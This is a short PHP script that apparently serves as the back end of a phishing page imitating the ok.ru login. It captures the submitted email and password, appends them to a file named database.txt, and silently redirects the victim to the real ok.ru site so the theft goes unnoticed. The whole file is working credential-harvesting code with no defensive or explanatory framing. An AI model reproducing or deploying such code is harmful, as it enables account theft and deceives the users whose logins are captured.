<?PHP
$Log = $_POST['st.email'];
$Pass = $_POST['st.password'];
$log = fopen("database.txt","at");
fwrite($log,"\n $Log:$Pass \n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; https://ok.ru/'></head></html>";
?>